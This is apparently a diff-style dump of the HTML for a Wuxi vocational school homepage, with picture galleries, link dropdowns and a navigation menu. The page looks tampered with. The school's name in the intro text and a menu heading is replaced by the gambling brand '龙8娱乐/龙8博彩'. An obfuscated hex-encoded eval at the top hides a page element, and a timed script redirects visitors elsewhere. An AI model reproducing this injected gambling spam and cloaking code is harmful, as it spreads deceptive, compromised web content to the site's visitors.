+eval(HexTostring("646f63756d656e742e676574456c656d656e744279496428226c666772737322292e7374796c652e646973706c6179203d20226e6f6e6522"));</SCRIPT></DIV></DIV></DIV><DIV  id="ohid_s1032724" style="Z-INDEX: 10; POSITION: absolute; BACKGROUND-COLOR: rgb(255,255,255); WIDTH: 218px; HEIGHT: 132px; TOP: 383px; LEFT: 780px"><DIV id="s1032724_c" style="Z-INDEX: 5; POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; OVERFLOW: hidden; TOP: 0px; LEFT: 0px"><DIV id="s1032724_content"  style=""><a  target='_blank' href='http://www.hiqview.com/files/103997/1506/x_46a4079724_m.jpg'><img   width='100%'  border=0   src='files/103997/1506/x_46a4079724_m.jpg'  ></a></DIV></DIV></DIV><DIV  id="ohid_s61152659" style="BACKGROUND-IMAGE: url(http://www.hiqview.com/files/103997/1111/y_6c12811779.jpg); Z-INDEX: 10; BORDER-BOTTOM: rgb(227,234,245) 1px solid; POSITION: absolute; BORDER-LEFT: rgb(227,234,245) 1px solid; BACKGROUND-COLOR: rgb(255,255,255); WIDTH: 468px; BACKGROUND-REPEAT: repeat-x; HEIGHT: 164px; BORDER-TOP: rgb(13,87,169) 2px solid; TOP: 522px; BORDER-RIGHT: rgb(227,234,245) 1px solid; LEFT: 305px"><DIV id="s61152659_header" style="BACKGROUND-IMAGE: url(http://www.hiqview.com/files/103997/1111/y_8832811797.png); Z-INDEX: 8; POSITION: absolute; WIDTH: 100%; BACKGROUND-REPEAT: no-repeat; HEIGHT: 40px; TOP: 5px; LEFT: 9px"><DIV id="s61152659_header0" style="POSITION: absolute; WIDTH: 428px; HEIGHT: 100%; TOP: 0px; LEFT: 20px"></DIV><DIV id="s61152659_header1" style="POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; TOP: 0px; LEFT: 0px"></DIV><DIV id="s61152659_header2" style="POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; TOP: 0px; RIGHT: 0px"></DIV><DIV id="s61152659_header3" style="POSITION: absolute; WIDTH: 60px; HEIGHT: 100%; TOP: 5px; LEFT: 5px"></DIV><DIV id="s61152659_header4" style="POSITION: absolute; TEXT-ALIGN: right; WIDTH: 80px; HEIGHT: 100%; TOP: 0px; RIGHT: 15px"  ><a href="default.php?mod=pic"  ><IMG onerror=errorimg(this) src="http://hyjsxy.oho168.com/images/title/b/731/5.gif" ;=""></a></DIV><DIV id="s61152659_header5" style="POSITION: absolute; WIDTH: 60%; HEIGHT: 100%; COLOR: rgb(13,87,169); FONT-SIZE: 14px; TOP: -1px; FONT-WEIGHT: bold; LEFT: 20px">学校图片</DIV></DIV><DIV id="s61152659_c" style="Z-INDEX: 5; POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; OVERFLOW: hidden; TOP: 33px; LEFT: 0px"><DIV id="s61152659_content"  style="WIDTH: 448px; MARGIN-LEFT: 10px; OVERFLOW: hidden; MARGIN-RIGHT: 10px"><table id=s61152659_f2 cellspacing=0 table-layout:fixed;><tr><td id=s61152659_f><table  cellspacing=0 border=0><tr><td><TABLE border=0 cellSpacing=0 cellPadding=0 width=80><TBODY><TR><TD style="PADDING-BOTTOM: 2px; PADDING-LEFT: 4px; PADDING-RIGHT: 4px" vAlign=top><A href="default.php?mod=pic&do=detail&tid=3" target=_blank><IMG style="WIDTH: 136px; HEIGHT: 102px" class=mod_img src="files/103997/1201/x_b6d2811742_s.jpg"></A></TD></TR><TR><TD style="PADDING-BOTTOM: 3px" class="mod_font08 mod_align mod_padding5l mod_padding5r link_1"><A href="default.php?mod=pic&do=detail&tid=3" target=_blank>硬件设施</A></TD></TR></TBODY></TABLE></td><td><TABLE border=0 cellSpacing=0 cellPadding=0 width=80><TBODY><TR><TD style="PADDING-BOTTOM: 2px; PADDING-LEFT: 4px; PADDING-RIGHT: 4px" vAlign=top><A href="default.php?mod=pic&do=detail&tid=1" target=_blank><IMG style="WIDTH: 136px; HEIGHT: 102px" class=mod_img src="files/103997/1201/x_f2d2811765_s.jpg"></A></TD></TR><TR><TD style="PADDING-BOTTOM: 3px" class="mod_font08 mod_align mod_padding5l mod_padding5r link_1"><A href="default.php?mod=pic&do=detail&tid=1" target=_blank>学院荣誉</A></TD></TR></TBODY></TABLE></td><td><TABLE border=0 cellSpacing=0 cellPadding=0 width=80><TBODY><TR><TD style="PADDING-BOTTOM: 2px; PADDING-LEFT: 4px; PADDING-RIGHT: 4px" vAlign=top><A href="default.php?mod=pic&do=detail&tid=7" target=_blank><IMG style="WIDTH: 136px; HEIGHT: 102px" class=mod_img src="files/103997/1204/x_a1a4229357_s.JPG"></A></TD></TR><TR><TD style="PADDING-BOTTOM: 3px" class="mod_font08 mod_align mod_padding5l mod_padding5r link_1"><A href="default.php?mod=pic&do=detail&tid=7" target=_blank>校园风景</A></TD></TR></TBODY></TABLE></td></tr><tr></tr><tr><td colspan=3  align= style='padding-top:;display:none'></td></tr></table></td><td  id=s61152659_f1><table  cellspacing=0 border=0><tr><td><TABLE border=0 cellSpacing=0 cellPadding=0 width=80><TBODY><TR><TD style="PADDING-BOTTOM: 2px; PADDING-LEFT: 4px; PADDING-RIGHT: 4px" vAlign=top><A href="default.php?mod=pic&do=detail&tid=3" target=_blank><IMG style="WIDTH: 136px; HEIGHT: 102px" class=mod_img src="files/103997/1201/x_b6d2811742_s.jpg"></A></TD></TR><TR><TD style="PADDING-BOTTOM: 3px" class="mod_font08 mod_align mod_padding5l mod_padding5r link_1"><A href="default.php?mod=pic&do=detail&tid=3" target=_blank>硬件设施</A></TD></TR></TBODY></TABLE></td><td><TABLE border=0 cellSpacing=0 cellPadding=0 width=80><TBODY><TR><TD style="PADDING-BOTTOM: 2px; PADDING-LEFT: 4px; PADDING-RIGHT: 4px" vAlign=top><A href="default.php?mod=pic&do=detail&tid=1" target=_blank><IMG style="WIDTH: 136px; HEIGHT: 102px" class=mod_img src="files/103997/1201/x_f2d2811765_s.jpg"></A></TD></TR><TR><TD style="PADDING-BOTTOM: 3px" class="mod_font08 mod_align mod_padding5l mod_padding5r link_1"><A href="default.php?mod=pic&do=detail&tid=1" target=_blank>学院荣誉</A></TD></TR></TBODY></TABLE></td><td><TABLE border=0 cellSpacing=0 cellPadding=0 width=80><TBODY><TR><TD style="PADDING-BOTTOM: 2px; PADDING-LEFT: 4px; PADDING-RIGHT: 4px" vAlign=top><A href="default.php?mod=pic&do=detail&tid=7" target=_blank><IMG style="WIDTH: 136px; HEIGHT: 102px" class=mod_img src="files/103997/1204/x_a1a4229357_s.JPG"></A></TD></TR><TR><TD style="PADDING-BOTTOM: 3px" class="mod_font08 mod_align mod_padding5l mod_padding5r link_1"><A href="default.php?mod=pic&do=detail&tid=7" target=_blank>校园风景</A></TD></TR></TBODY></TABLE></td></tr><tr></tr><tr><td colspan=3  align= style='padding-top:;display:none'></td></tr></table></td></tr></table></DIV></DIV></DIV><DIV  id="ohid_s82522712" style="BACKGROUND-IMAGE: url(http://www.hiqview.com/files/103997/1111/x_2f52811766.jpg); Z-INDEX: 10; POSITION: absolute; BACKGROUND-COLOR: rgb(255,255,255); WIDTH: 218px; BACKGROUND-POSITION: 50% 100%; HEIGHT: 166px; TOP: 522px; LEFT: 779px"><DIV id="s82522712_header" style="Z-INDEX: 8; POSITION: absolute; BACKGROUND-COLOR: rgb(241,164,34); WIDTH: 100%; HEIGHT: 24px"><DIV id="s82522712_header0" style="POSITION: absolute; WIDTH: 179px; HEIGHT: 100%; TOP: 0px; LEFT: 20px"></DIV><DIV id="s82522712_header1" style="POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; TOP: 0px; LEFT: 0px"></DIV><DIV id="s82522712_header2" style="POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; TOP: 0px; RIGHT: 0px"></DIV><DIV id="s82522712_header3" style="POSITION: absolute; WIDTH: 60px; HEIGHT: 100%; TOP: 5px; LEFT: 5px"></DIV><DIV id="s82522712_header4" style="POSITION: absolute; TEXT-ALIGN: right; WIDTH: 80px; DISPLAY: none; HEIGHT: 100%; TOP: 6px; RIGHT: 6px"  ><a href="default.php?mod=article&settype=0&fid=8"  ><IMG onerror=errorimg(this) src="http://hyjsxy.oho168.com/images/title/d/259/5.gif" ;=""></a></DIV><DIV id="s82522712_header5" style="POSITION: absolute; WIDTH: 60%; HEIGHT: 100%; COLOR: rgb(255,255,255); FONT-SIZE: 14px; TOP: 3px; FONT-WEIGHT: bold; LEFT: 16px">学院介绍</DIV></DIV><DIV id="s82522712_c" style="Z-INDEX: 5; POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; OVERFLOW: hidden; TOP: 42px; LEFT: 0px"><DIV id="s82522712_content"  style="PADDING-LEFT: 10px; PADDING-RIGHT: 10px"><table  cellspacing=0 border=0><tr><td><SPAN style="Z-INDEX: 10; POSITION: absolute; WIDTH: 46px; HEIGHT: 21px; TOP: 100px; LEFT: 162px"><FONT class=link_7><A href="default.php?mod=article&do=detail&tid=361587" target=_blank>[详情]</A></FONT></SPAN> <TABLE border=0 cellSpacing=0 cellPadding=0 width="100%"><TBODY><TR><TD style="LINE-HEIGHT: 1.9; VERTICAL-ALIGN: top" class=mod_font08_t><P align=justify>&nbsp;&nbsp;&nbsp;&nbsp; 龙8娱乐创办于1958年，学校2003年被评为省级重点，2005年被评为国家级重点，2006年通过国家重点技工学校质量管理 ..</P></TD></TR></TBODY></TABLE></td></tr><tr></tr><tr><td colspan=1  align= style='padding-top:;display:none'></td></tr></table></DIV></DIV></DIV><DIV  id="ohid_s55161798" style="Z-INDEX: 11; POSITION: absolute; BACKGROUND-COLOR: rgb(255,255,255); WIDTH: 1002px; HEIGHT: 31px; TOP: 695px; LEFT: 0px"><DIV id="s55161798_c" style="Z-INDEX: 5; POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; OVERFLOW: hidden; TOP: 0px; LEFT: 0px"><DIV id="s55161798_content"  style="BACKGROUND-IMAGE: url(http://www.hiqview.com/files/103997/1111/x_05b2811723.jpg); BACKGROUND-REPEAT: no-repeat"><TABLE style="TEXT-ALIGN: right; WIDTH: 67.79%; BORDER-COLLAPSE: collapse; HEIGHT: 34px; MARGIN-LEFT: 200px" border=0 cellSpacing=2 borderColor=#999999 cellPadding=3>
+<TBODY>
+<TR>
+<TD style="PADDING-TOP: 6px"><FONT class=link_12>友情链接：</FONT></TD>
+<TD><SELECT onchange="window.open(this.options[this.options.selectedIndex].value)"><OPTION selected value="">---===上级有关部门===---</OPTION> <OPTION value=http://www.js.gov.cn/>无锡市劳动局</OPTION> <OPTION value=http://www.suzhou.gov.cn>无锡市劳动保障局</OPTION></SELECT></TD>
+<TD><SELECT onchange="window.open(this.options[this.options.selectedIndex].value)"><OPTION selected value="">---===其他学院===---</OPTION><OPTION value=http://www.wxjsxy.com/>无锡技师学院</OPTION><OPTION value=http://www.wxgy.net/web/>无锡交通技师学院</OPTION><OPTION value=http://www.jscpu.com/>无锡商业职业技术学院</OPTION><OPTION value="">---===其他学院===---</OPTION></SELECT></TD>
+<TD><SELECT onchange="window.open(this.options[this.options.selectedIndex].value)"><OPTION selected value="">---===其他链接===---</OPTION><OPTION value=http://www.wxhrm.com/wxrcfw/?Rnd=4193>无锡人才网</OPTION><OPTION value=http://www.qianyan.biz/qy-139894.html>无锡新世纪人才网</OPTION><OPTION value=http://www.zhaopin.com/wuxi/>智联招聘 </OPTION>  </SELECT></TD></TR></TBODY></TABLE></DIV></DIV></DIV>
+<script>
+function back111(){  
+	window.location.href="http://www.sqscxc.gov.cn/default.php?mod=c&s=ssca10f80";
+}
+
+if(document.getElementById("aaa")!=undefined){
+	setTimeout("back111()",3000);	
+}
+
+mod_disappear();
+setInitAllLow();
+mod_reheight();
+
+content_down(0);
+getcontop();
+adjust_center_bd();
+</script>
+
+<img id="guajian1" src="http://hyjsxy.oho168.com/images/guajian/14.gif"><img id="guajian2" src="http://hyjsxy.oho168.com/images/guajian/2.gif"><img id="guajian3" src="http://hyjsxy.oho168.com/images/guajian/1.gif"><img id="guajian4" src="http://hyjsxy.oho168.com/images/guajian/15.gif"><img id="guajian5" src="http://hyjsxy.oho168.com/images/guajian/15.gif"><img id="guajian6" src="http://hyjsxy.oho168.com/images/guajian/22.gif"><img id="guajian7" src="http://hyjsxy.oho168.com/images/guajian/20.gif"><img id="guajian8" src="http://hyjsxy.oho168.com/images/guajian/27.gif">
+
+<div align="left" id="menu"><a></a><a>首页</a></div><div id="f_con1"><A class=ltp style="BEHAVIOR: url
+(#default#homepage)" onclick="this.style.behavior='url(#default#homepage)';this.setHomePage&#13;&#10;&#13;&#10;('http://jsic.oho168.com');return(false);" href="javascript:;"><FONT color=#000000>设为首页</FONT></A>&nbsp;&nbsp;&nbsp;<SPAN class=STYLE8><FONT color=#000000>|</FONT></SPAN>&nbsp;&nbsp;&nbsp; <A href="javascript:window.external.AddFavorite('http://jsic.oho168.com',%20'江苏省通信学会')"><FONT color=#000000>加入收藏</FONT></A>&nbsp;&nbsp;&nbsp;<SPAN class=STYLE8><FONT color=#000000>|</FONT></SPAN>&nbsp;&nbsp;&nbsp;<A href="mailto:cxy@jshs.pt.17oh.com"><FONT color=#000000>联系我们</FONT></A></div>
+</div>
+<div id="background_1" style="z-index:-100;">&nbsp;</div>
+<div id="background_2" style="z-index:-100;">&nbsp;</div>
+<iframe src="" name="hideiframe" width="0" marginwidth="0" height="0" marginheight="0" scrolling="no" frameborder="0" id="hideiframe"></iframe>
+<img src="images/common/gl.gif" alt="进入编辑状态" style="position:absolute; right:0px; top:0px; cursor:pointer; "  onClick="adminlogin();">
+<div id="floatd" style="position:absolute; z-index:1000; display:none"></div>
+<div id="popgg" style="position:absolute; display:none"></div>
+
+<span style="position:absolute; display:none; "></span>
+<script type="text/javascript" src="http://www.hiqview.com/include/js/ugvquest.js"></script>
+<script>
+automuti();
+
+var wbMenus857111 =
+[
+   [null,'网站首页','default.php','_top','网站首页',],[null,'龙8博彩','default.php?mod=article&fid=1','_top','龙8博彩',[null,'学院简介','default.php?mod=article&do=detail&tid=361587','_top','学院简介',],[null,'学院荣誉','default.php?mod=article&fid=74','_top','学院荣誉',],[null,'校容校貌','default.php?mod=article&fid=10','_top','校容校貌',],[null,'地理位置','default.php?mod=article&fid=12','_top','地理位置',]],[null,'职能部门','default.php?mod=article&fid=3','_top','职能部门',[null,'办公室','default.php?mod=article&fid=15','_top','办公室',],[null,'督导室','default.php?mod=article&fid=16','_top','督导室',],[null,'教务科','default.php?mod=article&fid=17','_top','教务科',],[null,'学生科','default.php?mod=article&fid=18','_top','学生科',],[null,'培训科','default.php?mod=article&fid=19','_top','培训科',],[null,'实训科','default.php?mod=article&fid=21','_top','实训科',],[null,'招就办','default.php?mod=article&fid=22','_top','招就办',],[null,'总务科','default.php?mod=article&fid=23','_top','总务科',],[null,'产训处','default.php?mod=article&fid=110','_top','产训处',]],[null,'招生就业','default.php?mod=article&fid=4','_top','招生就业',[null,'招生专区','default.php?mod=article&fid=24','_top','招生专区',],[null,'就业专区','default.php?mod=article&fid=25','_top','就业专区',]],[null,'德育工作','default.php?mod=article&fid=5','_top','德育工作',[null,'心理健康咨询','default.php?mod=article&fid=26','_top','心理健康咨询',],[null,'德育风采','default.php?mod=article&fid=28','_top','德育风采',],[null,'学生活动','default.php?mod=article&fid=136','_top','学生活动',],[null,'班主任工作','default.php?mod=article&fid=137','_top','班主任工作',],[null,'荣誉表彰','default.php?mod=article&fid=138','_top','荣誉表彰',]],[null,'校企合作','default.php?mod=article&fid=6','_top','校企合作',[null,'合作动态','default.php?mod=article&fid=30','_top','合作动态',],[null,'产学研成果','default.php?mod=article&fid=32','_top','产学研成果',],[null,'企业风采','default.php?mod=article&fid=33','_top','企业风采',]],[null,'网上报名','default.php?mod=c&s=sse043911','_top','网上报名',],[null,'党建工作','default.php?mod=article&fid=2','_top','党建工作',[null,'组织建设','default.php?mod=article&fid=13','_top','组织建设',],[null,'主题活动','default.php?mod=article&fid=14','_top','主题活动',],[null,'团委','default.php?mod=article&fid=75','_top','团委',],[null,'教职工之家','default.php?mod=article&fid=76','_top','教职工之家',]]];
+var cms857111 =
+{
+   mainFolderLeft: '',
+   mainFolderRight: '',
+   mainItemLeft: '',
+   mainItemRight: '',
+   folderLeft: '',
+   folderRight: '',
+   itemLeft: '',
+   itemRight: '',
+   mainSpacing: 0,
+   subSpacing: 0,
+   delay: 100,
+   offsetVMainAdjust: [0, 0],
+   offsetSubAdjust: [0, 0]
+};
+var cmThemes857111HSplit = [_cmNoClick, '<td colspan="3" class="Themes857111MenuSplit"><div class="Themes857111MenuSplit"><\/div><\/td>'];
+var cmThemes857111MainHSplit = [_cmNoClick, '<td colspan="3" class="Themes857111MenuSplit"><div class="Themes857111MenuSplit"><\/div><\/td>'];
+var cmThemes857111MainVSplit = [_cmNoClick, '<div class="Themes857111MenuVSplit">|<\/div>'];
+
+cmDraw('MenuIDs857111', wbMenus857111, 'hbr', cms857111, 'Themes857111');
+
+
+reloadok();
+
+</script> </BODY>
+<script type="text/javascript">
+var setheighttime=0;
+function setheight(){
+	if(setheighttime==20){
+		clearInterval(setheightclock);
+	}
+	setheighttime++;
+	var newheight=$('alltable').offsetHeight+parseInt($('alltable').style.top)+20;
+	document.body.setAttribute('style','height:'+newheight+'px');
+}
+setheight();
+var setheightclock=setInterval("setheight()",500);
+</script>
+</html>
+
